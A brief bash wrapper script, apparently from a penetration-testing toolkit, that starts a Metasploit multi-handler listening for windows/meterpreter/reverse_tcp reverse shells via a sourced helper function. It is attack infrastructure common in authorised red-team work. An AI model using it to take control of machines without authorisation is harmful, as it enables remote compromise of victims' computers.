#!/bin/bash

: '
meterpreter: start meterpreter listener windows/meterpreter/reverse_tcp
'

source ${SCRIPTS_DIR}/shell/msfconsole/.files/listen_to_meterpreter_rev_shell.sh

PAYLOAD="windows/meterpreter/reverse_tcp"

create_meterpreter_multi_handler "${PAYLOAD}"